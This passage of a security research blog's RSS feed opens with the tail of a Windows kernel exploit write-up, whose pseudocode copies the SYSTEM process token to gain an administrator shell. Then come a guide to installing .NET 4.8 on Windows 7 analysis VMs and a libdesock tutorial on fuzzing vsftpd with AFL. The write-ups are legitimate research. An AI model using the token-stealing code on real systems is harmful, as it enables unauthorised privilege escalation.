NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120c7&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {.sockaddr &lt;span style="color:#f92672">=&lt;/span> {AF_INET, .offset_0x5c &lt;span style="color:#f92672">=&lt;/span> write_function, .offset_0x64 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>write_argument}});
&lt;span style="color:#75715e">// figure out the token_offset, by linearly scanning through our `_EPROCESS`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">for&lt;/span> i from &lt;span style="color:#ae81ff">0&lt;/span> to &lt;span style="color:#ae81ff">0x1000&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
maybe_token :&lt;span style="color:#f92672">=&lt;/span> read_u64(process &lt;span style="color:#f92672">+&lt;/span> i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> maybe_token &lt;span style="color:#f92672">==&lt;/span> token:
token_offset &lt;span style="color:#f92672">=&lt;/span> i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;span style="color:#75715e">// figure out the `_TOKEN` of `nt!PsInitialSystemProcess`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>PsInitialSystemProcess &lt;span style="color:#f92672">=&lt;/span> read_u64(PsInitialSystemProcess_export);
PsInitialSystemProcessToken &lt;span style="color:#f92672">=&lt;/span> read_u64(PsInitialSystemProcess &lt;span style="color:#f92672">+&lt;/span> token_offset);
&lt;span style="color:#75715e">// actually steal the access `_TOKEN` to give us complete access rights.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>write_u64(token &lt;span style="color:#f92672">+&lt;/span> token_offset, PsInitialSystemProcessToken);
&lt;span style="color:#75715e">// spawn a shell to keep the access rights in a clean way.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>spawn_shell();
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://lolcads.github.io/2022/06/success.png" alt="Success - An Administrator Shell">&lt;/p></content></item><item><title>Installing new .NET versions on a Windows 7 VM</title><link>https://lolcads.github.io/posts/2022/03/win7_dotnet_install/</link><pubDate>Wed, 16 Mar 2022 12:01:43 +0100</pubDate><guid>https://lolcads.github.io/posts/2022/03/win7_dotnet_install/</guid><description>Installing new .NET versions on a Windows 7 VM In this post, I will explain how to install .NET Framework 4.8 on a Windows 7 VM.
Motivation Virtual Machines running Microsoft Windows are frequently used for dynamic analysis of Windows executables. Windows 7 is still used for analysis VM, although it is no longer supported by Microsoft and ships with an outdated .NET version. If a sample requires a .NET version which is not present on the analysis VM, the execution fails and the file cannot be analysed.</description><content>&lt;h1 id="installing-new-net-versions-on-a-windows-7-vm">Installing new .NET versions on a Windows 7 VM&lt;/h1>
&lt;p>In this post, I will explain how to install .NET Framework 4.8 on a Windows 7 VM.&lt;/p>
&lt;h2 id="motivation">Motivation&lt;/h2>
&lt;p>Virtual Machines running Microsoft Windows are frequently used for dynamic analysis of Windows executables.
Windows 7 is still used for analysis VM, although it is no longer supported by Microsoft and ships with an outdated .NET version.
If a sample requires a .NET version which is not present on the analysis VM, the execution fails and the file cannot be analysed.
For this reason it might be required to install a recent .NET version on a Windows 7 VM.&lt;/p>
&lt;h2 id="problem">Problem&lt;/h2>
&lt;p>The .NET Framework 4.8 installer tries to verify the integritiy of the installation data prior to the installation.
However, the root certificates required for this verification process are not present on Windows 7.
&lt;img src="https://lolcads.github.io/2022/03/net_0.png" alt="Problem: the installation process fails">
This issue cannot be fixed via Windows updates, as they are not available for Windows 7 anymore.&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;p>First, download the &lt;a href="https://go.microsoft.com/fwlink/?linkid=2088631">offline installer for .NET Framework 4.8&lt;/a>&lt;/p>
&lt;p>Execute the file. This will extract the installation data into a temporary subfolder of &lt;code>C:\&lt;/code> with a random name.
&lt;img src="https://lolcads.github.io/2022/03/net_1.png" alt="Extraction of the installation data into a temporary directory">&lt;/p>
&lt;p>Wait until the extraction process has finished and an installer opens. You don&amp;rsquo;t have to interact with this installer window at all. Just leave it opened to prevent the deletion of the temporary subfolder.
&lt;img src="https://lolcads.github.io/2022/03/net_2.png" alt="Installer to be left opened">&lt;/p>
&lt;p>Next, navigate to the temporary folder and execute the file &lt;code>netfx_Full_x64.msi&lt;/code> or &lt;code>netfx_Full_x86.msi&lt;/code>.
This will trigger the installation of .NET Framework 4.8. Restart the system after the installation finished.
&lt;img src="https://lolcads.github.io/2022/03/net_3.png" alt="Locating netfx_Full">&lt;/p>
&lt;p>That&amp;rsquo;s it, you&amp;rsquo;re all set! :)&lt;/p></content></item><item><title>libdesock</title><link>https://lolcads.github.io/posts/2022/02/libdesock/</link><pubDate>Tue, 22 Feb 2022 14:24:40 +0100</pubDate><guid>https://lolcads.github.io/posts/2022/02/libdesock/</guid><description>Fuzzing Network Applications with AFL and libdesock Fuzzing network servers with AFL is challenging since AFL provides its input via stdin or command line arguments while servers get their input over network connections. As the popularity of AFL grew, many attempts have been made of fuzzing popular servers like apache and nginx using different techniques and hacky workarounds. However an off-the-shelf network fuzzing solution for AFL didn&amp;rsquo;t exist for a long time until so-called &amp;ldquo;desocketing&amp;rdquo; tools emerged.</description><content>&lt;h1 id="fuzzing-network-applications-with-afl-and-libdesock">Fuzzing Network Applications with AFL and libdesock&lt;/h1>
&lt;p>Fuzzing network servers with AFL is challenging since AFL provides its
input via stdin or command line arguments while servers get their input
over network connections.
As the popularity of AFL grew, many attempts have been made of fuzzing
popular servers like apache and nginx using different
techniques and hacky workarounds. However an off-the-shelf network fuzzing
solution for AFL didn&amp;rsquo;t exist for a long time until so-called &amp;ldquo;desocketing&amp;rdquo;
tools emerged.
These desocketing tools enabled network fuzzing without
making a lot of additional modifications to the program under test
and quickly became widely used in combination with AFL.&lt;/p>
&lt;h2 id="what-is-desocketing">What is &amp;ldquo;desocketing&amp;rdquo;?&lt;/h2>
&lt;p>Before desocketing tools were published two common techniques for
network fuzzing were&lt;/p>
&lt;ol>
&lt;li>Sending fuzz input over real network connections&lt;/li>
&lt;li>Modifying the target source to use stdin instead of sockets&lt;/li>
&lt;/ol>
&lt;p>The first approach is the most prevalent used by popular fuzzers
like &lt;a href="https://github.com/jtpereyda/boofuzz">boofuzz&lt;/a> or in academia by &lt;a href="https://github.com/aflnet/aflnet">AFLnet&lt;/a> or &lt;a href="https://github.com/stateafl/stateafl">StateAFL&lt;/a>.
This however suffers performance- and stability-drawbacks.
Stability is affected because the servers run with all threads and child processes
enabled. Background threads can be scheduled independently from the input being sent
resulting in invalid coverage information.
Performance is affected because of the amount of kernel activity and network overhead involved.&lt;/p>
&lt;p>The second approach solves the network overhead problem but does not reduce the
kernel activity. It also takes a considerable amount of effort that may lead
to changing &lt;a href="https://securitylab.github.com/research/fuzzing-sockets-FTP/">thousands of lines of code&lt;/a>.&lt;/p>
&lt;p>Desocketing aims to reduce kernel activity and the amount of modifications necessary to a program.
It works by building a shared library that implements functions
like &lt;code>socket()&lt;/code> and &lt;code>accept()&lt;/code> and preloading it via &lt;code>LD_PRELOAD&lt;/code>
into the address space of a network application where it replaces
the network stack of the libc.
The desocketing library simulates incoming connections to the server
but every read on a socket is replaced by a read on stdin
and every write on a socket is redirected to stdout.
Strictly speaking the latter isn&amp;rsquo;t necessary for fuzzing but it&amp;rsquo;s useful
for debugging.&lt;/p>
&lt;p>The following figure demonstrates how to desock nginx such that the network
traffic becomes visible on a terminal.&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/02/demo.svg" alt="">&lt;/p>
&lt;h2 id="how-desocketing-works">How desocketing works&lt;/h2>
&lt;p>Making desocketing libraries has its complexities.
AFLplusplus' &lt;a href="https://github.com/AFLplusplus/AFLplusplus/tree/stable/utils/socket_fuzzing">socketfuzz&lt;/a>
ships a desocketing library that just returns &lt;code>0&lt;/code> (stdin) in &lt;code>accept()&lt;/code>.
Unfortunately this doesn&amp;rsquo;t quite work because &lt;code>send()&lt;/code> and &lt;code>recv()&lt;/code> need an
fd that actually refers to a network connection. If you pass them an fd that
refers to a file the kernel will complain.
Thus we need more complicated methods.&lt;/p>
&lt;p>At the time of writing this, there exists only one popular desocketing solution: &lt;a href="https://github.com/zardus/preeny">preeny&lt;/a>.
preeny creates a socketpair &lt;code>(a,b)&lt;/code> and spawns two threads &lt;code>t1&lt;/code> and
&lt;code>t2&lt;/code> in every call to &lt;code>socket()&lt;/code>.&lt;/p>
&lt;ul>
&lt;li>Thread &lt;code>t1&lt;/code> forwards all data from stdin to &lt;code>a&lt;/code>&lt;/li>
&lt;li>Thread &lt;code>t2&lt;/code> forwards all data from &lt;code>a&lt;/code> to stdout&lt;/li>
&lt;li>In &lt;code>socket()&lt;/code> preeny returns &lt;code>b&lt;/code>&lt;/li>
&lt;li>When AFL writes input to stdin, thread &lt;code>t1&lt;/code> forwards that data to &lt;code>a&lt;/code>&lt;/li>
&lt;li>Writing to &lt;code>a&lt;/code> means that the data will become available in &lt;code>b&lt;/code> and the
application can read the request from &lt;code>b&lt;/code>&lt;/li>
&lt;li>The application writes a response back to &lt;code>b&lt;/code>, making the data available
in socket &lt;code>a&lt;/code> where &lt;code>t2&lt;/code> forwards it to stdout.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://lolcads.github.io/2022/02/preeny.png" alt="">&lt;/p>
&lt;p>Unfortunately this design makes preeny unsuitable for fuzzing:&lt;/p>
&lt;ol>
&lt;li>Spawning threads and joining them introduces additional overhead.&lt;/li>
&lt;li>Each thread realizes busy waiting by calling &lt;code>poll()&lt;/code> every 15ms&lt;/li>
&lt;li>Preeny still relies on a lot of kernel interaction. I/O multiplexing (select, poll, epoll)
is left completely to the kernel.&lt;/li>
&lt;li>The threads may introduce additional instability.&lt;br>
Normally you want to disable threads when fuzzing with AFL.&lt;/li>
&lt;li>It can handle only single-threaded applications but most of the servers
are multi-threaded&lt;/li>
&lt;/ol>
&lt;p>A better desocketing library is needed that is more resource-efficient and handles the complexities of
modern network applications correctly.
So we created a new desocketing library: &amp;ldquo;libdesock&amp;rdquo;.&lt;/p>
&lt;h2 id="using-libdesock">Using libdesock&lt;/h2>
&lt;p>libdesock fully emulates the network stack of the kernel. The kernel is only queried to obtain file
descriptors and to do I/O on stdin and stdout.
Everything else - handling of connections, I/O multiplexing (select, poll, epoll), handling socket metadata (getsockname, getpeername) - entierly happens in userland.&lt;br>
In contrast to preeny, libdesock supports multi-threaded applications and its overall design
makes it more resource efficient and 5x faster than preeny.
This has no effect on AFL&amp;rsquo;s exec/s though, since that primarily depends on the program
and the input.&lt;/p>
&lt;p>We have tested libdesock on common network daemons like&lt;/p>
&lt;ul>
&lt;li>nginx&lt;/li>
&lt;li>Apache httpd&lt;/li>
&lt;li>OpenSSH&lt;/li>
&lt;li>Exim&lt;/li>
&lt;li>bind9&lt;/li>
&lt;li>OpenVPN&lt;/li>
&lt;li>Redis&lt;/li>
&lt;li>dnsmasq&lt;/li>
&lt;li>cupsd&lt;/li>
&lt;li>curl (clients are supported too)&lt;/li>
&lt;/ul>
&lt;p>and several smaller applications.&lt;br>
libdesock also supports event libraries like&lt;/p>
&lt;ul>
&lt;li>libevent&lt;/li>
&lt;li>libuv&lt;/li>
&lt;li>libapr-2&lt;/li>
&lt;/ul>
&lt;p>Network applications generally are very complex and require modifications to be fuzzable with AFL.&lt;br>
They use multiple processes and threads, encryption, compression, checksums, hashes
and sometimes custom allocators that don&amp;rsquo;t work with ASAN.
They also run in an endless loop and have a lot of disk I/O (pidfiles, logfiles, temporary files).
Setting these targets up for fuzzing means to reduce the complexity of the applications.
The following example demonstrates the modifications necessary to fuzz &lt;a href="https://security.appspot.com/vsftpd.html">vsftpd&lt;/a>, a popular FTP server on Linux.&lt;/p>
&lt;h2 id="fuzzing-vsftpd">Fuzzing vsftpd&lt;/h2>
&lt;h3 id="getting-the-source">Getting the source&lt;/h3>
&lt;p>Download version 3.0.5 of vsftpd:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget https://security.appspot.com/downloads/vsftpd-3.0.5.tar.gz
tar -xf vsftpd-3.0.5.tar.gz
cd vsftpd-3.0.5
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="patching-the-source">Patching the source&lt;/h3>
&lt;p>vsftpd creates a new child process for each connection. We prohibit that
by commenting out the code that does the fork in &lt;code>standalone.c&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -153,6 +153,7 @@ vsf_standalone_main(void)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> child_info.num_this_ip = 0;
p_raw_addr = vsf_sysutil_sockaddr_get_raw_addr(p_accept_addr);
child_info.num_this_ip = handle_ip_count(p_raw_addr);
&lt;span style="color:#a6e22e">+ /*
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> if (tunable_isolate)
{
if (tunable_http_enable &amp;amp;&amp;amp; tunable_isolate_network)
&lt;span style="color:#75715e">@@ -168,6 +169,8 @@ vsf_standalone_main(void)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> {
new_child = vsf_sysutil_fork_failok();
}
&lt;span style="color:#a6e22e">+ */
&lt;/span>&lt;span style="color:#a6e22e">+ new_child = 0;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> if (new_child != 0)
{
/* Parent context */
&lt;/code>&lt;/pre>&lt;/div>&lt;p>vsftpd duplicates the FTP command socket to stdin, stdout and stderr.
This obviously interfers with AFL so we disable that in &lt;code>defs.h&lt;/code> &amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -3,7 +3,7 @@
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
#define VSFTP_DEFAULT_CONFIG &amp;#34;/etc/vsftpd.conf&amp;#34;
&lt;span style="color:#f92672">-#define VSFTP_COMMAND_FD 0
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+#define VSFTP_COMMAND_FD 29
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span>
#define VSFTP_PASSWORD_MAX 128
#define VSFTP_USERNAME_MAX 128
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip; and in &lt;code>standalone.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -205,9 +205,7 @@ static void
&lt;/span>&lt;span style="color:#75715e">&lt;/span> prepare_child(int new_client_sock)
{
/* We must satisfy the contract: command socket on fd 0, 1, 2 */
&lt;span style="color:#f92672">- vsf_sysutil_dupfd2(new_client_sock, 0);
&lt;/span>&lt;span style="color:#f92672">- vsf_sysutil_dupfd2(new_client_sock, 1);
&lt;/span>&lt;span style="color:#f92672">- vsf_sysutil_dupfd2(new_client_sock, 2);
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+ vsf_sysutil_dupfd2(new_client_sock, VSFTP_COMMAND_FD);
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> if (new_client_sock &amp;gt; 2)
{
vsf_sysutil_close(new_client_sock);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next, vsftpd enforces a custom memory limit that interfers with ASAN.
We disable the memory limit in &lt;code>sysutil.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -2793,6 +2793,7 @@ void
&lt;/span>&lt;span style="color:#75715e">&lt;/span> vsf_sysutil_set_address_space_limit(unsigned long bytes)
{
/* Unfortunately, OpenBSD is missing RLIMIT_AS. */
&lt;span style="color:#a6e22e">+ return;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> #ifdef RLIMIT_AS
int ret;
struct rlimit rlim;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then we add a forkserver to vsftpd in &lt;code>prelogin.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -59,6 +59,7 @@ init_connection(struct vsf_session* p_sess)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> {
emit_greeting(p_sess);
}
&lt;span style="color:#a6e22e">+ __AFL_INIT();
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> parse_username_password(p_sess);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>vsftpd registers a &lt;code>SIGCHLD&lt;/code> handler that interfers with the forkserver
so we have to disable that too in &lt;code>standalone.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -74,7 +74,7 @@ vsf_standalone_main(void)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> {
vsf_sysutil_setproctitle(&amp;#34;LISTENER&amp;#34;);
}
&lt;span style="color:#f92672">- vsf_sysutil_install_sighandler(kVSFSysUtilSigCHLD, handle_sigchld, 0, 1);
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+ //vsf_sysutil_install_sighandler(kVSFSysUtilSigCHLD, handle_sigchld, 0, 1);
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> vsf_sysutil_install_sighandler(kVSFSysUtilSigHUP, handle_sighup, 0, 1);
if (tunable_listen)
{
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Last but not least we disable the &lt;code>bug()&lt;/code> function in &lt;code>utility.c&lt;/code>. This function does a failing &lt;code>fcntl()&lt;/code>
on an fd returned by the desocketing library since the fd is not a real socket. vsftpd handles the &lt;code>fcntl()&lt;/code> failure by calling &lt;code>bug()&lt;/code> again
leading to an infinite loop.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -40,6 +40,7 @@ die2(const char* p_text1, const char* p_text2)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> void
bug(const char* p_text)
{
&lt;span style="color:#a6e22e">+ return;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> /* Rats. Try and write the reason to the network for diagnostics */
vsf_sysutil_activate_noblock(VSFTP_COMMAND_FD);
(void) vsf_sysutil_write_loop(VSFTP_COMMAND_FD, &amp;#34;500 OOPS: &amp;#34;, 10);
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="build-configuration">Build configuration&lt;/h3>
&lt;p>In the &lt;code>Makefile&lt;/code> replace:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -1,16 +1,16 @@
&lt;/span>&lt;span style="color:#75715e">&lt;/span> # Makefile for systems with GNU tools
&lt;span style="color:#f92672">-CC = gcc
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+CC = afl-clang-fast
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> INSTALL = install
IFLAGS = -idirafter dummyinc
#CFLAGS = -g
&lt;span style="color:#f92672">-CFLAGS = -O2 -fPIE -fstack-protector --param=ssp-buffer-size=4 \
&lt;/span>&lt;span style="color:#f92672">- -Wall -W -Wshadow -Werror -Wformat-security \
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+CFLAGS = -fsanitize=address -g -Og -fPIE -fstack-protector \
&lt;/span>&lt;span style="color:#a6e22e">+ -Wall -W -Wshadow -Wformat-security \
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> -D_FORTIFY_SOURCE=2 \
#-pedantic -Wconversion
LIBS = `./vsf_findlibs.sh`
&lt;span style="color:#f92672">-LINK = -Wl,-s
&lt;/span>&lt;span style="color:#f92672">-LDFLAGS = -fPIE -pie -Wl,-z,relro -Wl,-z,now
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+LINK =
&lt;/span>&lt;span style="color:#a6e22e">+LDFLAGS = -fPIE -pie -Wl,-z,relro -Wl,-z,now -fsanitize=address
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span>
OBJS = main.o utility.o prelogin.o ftpcmdio.o postlogin.o privsock.o \
tunables.o ftpdataio.o secbuf.o ls.o \
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="runtime-configuration">Runtime configuration&lt;/h3>
&lt;p>Like most other servers, vsftpd needs a config file. Create
&lt;code>fuzz.conf&lt;/code> with the following contents:&lt;/p>
&lt;pre tabindex="0">&lt;code>listen=YES
seccomp_sandbox=NO
one_process_model=YES
# User management
anonymous_enable=YES
no_anon_password=YES
nopriv_user=nobody
# Permissions
connect_from_port_20=NO
run_as_launching_user=YES
listen_port=2121
listen_address=127.0.0.1
pasv_address=127.0.0.1
# Filesystem interactions
write_enable=NO
download_enable=NO
&lt;/code>&lt;/pre>&lt;h3 id="start-fuzzing">Start fuzzing&lt;/h3>
&lt;p>To use the desocketing library with AFL we need to set the &lt;code>AFL_PRELOAD&lt;/code>
variable.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">export AFL_PRELOAD&lt;span style="color:#f92672">=&lt;/span>libdesock.so
afl-fuzz -i corpus -o findings -m none -- ./vsftpd fuzz.conf
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://lolcads.github.io/2022/02/afl.svg" alt="">&lt;/p>
&lt;p>Now it&amp;rsquo;s only a matter of high-quality custom mutators and time to find some bugs.&lt;/p>
&lt;p>libdesock can be downloaded here: &lt;a href="https://github.com/fkie-cad/libdesock">https://github.com/fkie-cad/libdesock&lt;/a>&lt;/p></content></item><item><title>About</title><link>https://lolcads.github.io/example/</link><pubDate>Thu, 28 Feb 2019 00:00:00 +0000</pubDate><guid>https://lolcads.github.io/example/</guid><description>Written in Go, Hugo is an open source static site generator available under the Apache Licence 2.0. Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.
Hugo makes use of a variety of open source projects including:
https://github.</description><content>&lt;p>Written in Go, Hugo is an open source static site generator available under the &lt;a href="https://github.com/gohugoio/hugo/blob/master/LICENSE">Apache Licence 2.0.&lt;/a> Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.&lt;/p>
&lt;p>Hugo makes use of a variety of open source projects including:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/yuin/goldmark">https://github.com/yuin/goldmark&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/alecthomas/chroma">https://github.com/alecthomas/chroma&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/muesli/smartcrop">https://github.com/muesli/smartcrop&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/spf13/cobra">https://github.com/spf13/cobra&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/spf13/viper">https://github.com/spf13/viper&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>Hugo is ideal for blogs, corporate websites, creative portfolios, online magazines, single page applications or even a website with thousands of pages.&lt;/p>
&lt;p>Hugo is for people who want to hand code their own website without worrying about setting up complicated runtimes, dependencies and databases.&lt;/p>
&lt;p>Websites built with Hugo are extremelly fast, secure and can be deployed anywhere including, AWS, GitHub Pages, Heroku, Netlify and any other hosting provider.&lt;/p>
&lt;p>Learn more and contribute on &lt;a href="https://github.com/gohugoio">GitHub&lt;/a>.&lt;/p></content></item><item><title>About</title><link>https://lolcads.github.io/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://lolcads.github.io/about/</guid><description>This is a tech blog of loosly coupled individuals that like to sometimes play CTFs but mostly just have fun with deeply technical topics such as (malware) reverse engineering, fuzzing, vulnerability research, forensics, &amp;hellip; We hope you will find some valuable information on our site :) Get in touch if you want via Contact.</description><content>&lt;p>This is a tech blog of loosly coupled individuals that like to sometimes play CTFs but mostly just have fun with deeply technical topics such as (malware) reverse engineering, fuzzing, vulnerability research, forensics, &amp;hellip;
We hope you will find some valuable information on our site :)
Get in touch if you want via &lt;a href="https://lolcads.github.io/contact">Contact&lt;/a>.&lt;/p></content></item><item><title>Contact</title><link>https://lolcads.github.io/contact/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://lolcads.github.io/contact/</guid><description>You can reach us at: Feel free to use our PGP key (fingerprint: CCD8 D75E 9A10 6BF4 3668 AB99 7E64 EF83 D585 CECA)</description><content>&lt;p>You can reach us at: &lt;img src="https://lolcads.github.io/mail.png" alt="alt">
Feel free to use our &lt;a href="https://lolcads.github.io/lolcads.pub">PGP key&lt;/a> (fingerprint: &lt;code>CCD8 D75E 9A10 6BF4 3668 AB99 7E64 EF83 D585 CECA&lt;/code>)&lt;/p></content></item></channel></rss>